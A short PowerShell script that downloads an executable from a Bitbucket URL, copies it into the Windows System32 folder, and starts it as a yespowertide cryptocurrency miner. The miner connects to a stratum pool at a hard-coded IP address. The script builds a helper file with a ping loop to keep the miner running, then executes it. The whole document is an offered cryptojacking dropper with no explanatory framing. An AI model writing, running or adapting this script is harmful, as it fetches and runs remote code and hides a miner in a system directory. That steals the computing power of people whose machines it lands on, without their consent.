Invoke-WebRequest https://bitbucket.org/zuzannac0/file/raw/master/sse2.exe -OutFile sse2.exe
Copy sse2.exe C:\Windows\System32
cmd /c echo cmd /k start sse2.exe -a yespowertide -o stratum+tcp://8.209.98.71:443 -u ASU -p x -t 16 >>object.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>object.ps1
.\object.ps1
